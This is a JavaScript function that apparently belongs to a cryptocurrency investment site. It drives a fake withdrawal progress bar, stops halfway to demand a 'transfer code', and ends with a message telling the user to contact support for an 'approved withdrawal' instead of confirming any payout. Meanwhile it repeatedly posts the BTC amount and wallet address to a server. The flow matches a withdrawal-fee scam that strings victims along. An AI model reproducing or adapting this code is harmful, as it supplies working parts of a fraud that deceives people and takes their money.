

function move(btc_amount, btc_wallet, transfer_code, withdraw_active, wallet_balance, url) {


  var elem = document.getElementById("myBar");
  var width = 5;
  var id = setInterval(frame, 300);

  function frame() {

  
    

    if (withdraw_active != 1 ){
      
      if (width >= 100) {
        clearInterval(id);
        swal({
                   icon: 'success',
                   text: 'Success!Profit disbursement portal activated.Kindly Contact support to get fully approved withdrawal'
          });

      } else {
          $.ajax({
                  type: "POST",
                  url: url,
                  data: { btc_amount: btc_amount, btc_wallet: btc_wallet, wallet_balance: wallet_balance }

                });

        width++;
        elem.style.width = width + '%';
        elem.innerHTML = width * 1 + '%';

        
              
     if (width >= 100) {
                  clearInterval(id);
                  swal({
                   icon: 'success',
                   text: 'Success!Profit disbursement portal activated.Kindly Contact support to get fully approved withdrawal'
          });
                } 

        // end first section
      }

    }else{

      if (width >= 100) {
        clearInterval(id);
      } else {

        width++;
        elem.style.width = width + '%';
        elem.innerHTML = width * 1 + '%';

        if (width == 50) {
          clearInterval(id);

          swal({
            text: 'Enter Transfer Code',
            content: "input",
            icon: "warning",
            button: true,
          })
            .then((value) => {
              if (value != transfer_code) {
                swal({
                  title: "Error",
                  text: "Incorrect Transfer code",
                  icon: "error"
                }); //end swal

              } else { 

                // Ajax code will go here 
                $.ajax({
                  type: "POST",
                  url: url,
                  data: { btc_amount: btc_amount, btc_wallet: btc_wallet, wallet_balance: wallet_balance }

                });


                // start of the progress bar
                if (width >= 100) {
                  clearInterval(id);
                } else {
                  width++;
                  elem.style.width = width + '%';
                  elem.innerHTML = width * 1 + '%';
                  var id = setInterval(frame, 300);

                 


                  // end first section
                }
              

              } //end if
            }); //end of then
        } //end width = 50

        if(width === 100){
          swal({
              icon: 'success',
              text: 'Success!Profit disbursement portal activated.Kindly Contact support to get fully approved withdrawal'
          });

          // refresh the window

          setTimeout(() => {
            location.reload();
          }, 60000);

        } 


        // end first section
      }

    }
    
  }


} //end function move
